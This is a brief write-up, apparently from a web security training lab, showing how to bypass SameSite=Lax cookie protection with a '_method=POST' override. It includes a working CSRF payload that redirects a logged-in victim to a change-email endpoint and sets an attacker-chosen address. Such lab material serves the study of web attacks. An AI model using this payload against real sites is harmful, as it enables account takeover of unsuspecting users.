If the website use `Lax` for `SameSite` parameter, you solely send `GET` method in the request. But we can bypass it by using `_method` to override the method. 

```
<script>
    document.location = "https://0a5b0073040c828c809f039100da0025.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>
```